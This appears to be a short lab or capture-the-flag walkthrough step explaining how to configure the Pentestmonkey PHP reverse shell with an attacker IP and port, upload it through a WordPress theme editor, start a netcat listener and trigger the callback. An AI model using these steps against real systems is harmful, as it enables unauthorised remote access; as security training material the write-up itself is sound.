This screenshot shows the reverse.php file opened in nano, which contains a PHP reverse shell script sourced from Pentestmonkey.

Purpose:

This script allows for a remote shell connection by initiating a callback to the attacker's machine.

The attacker sets their own IP and port in this file (further down in the script), allowing the reverse connection.

Steps:

Open reverse.php using a text editor like nano.

Replace the IP and port variables inside the script with your attack box details:

php
Copy
Edit
$ip = '10.38.1.110';  // Attacker's IP
$port = 1234;         // Listener port
Upload this script to a writable path on the target system (e.g., through WordPress theme editor).

Set up a listener on your machine:

bash
Copy
Edit
nc -lvp 1234
Trigger the reverse shell by accessing the uploaded PHP file via browser.

Takeaway:
The use of well-known reverse shell scripts (like this one) is a reliable way to gain remote access once file upload or code execution is achieved.
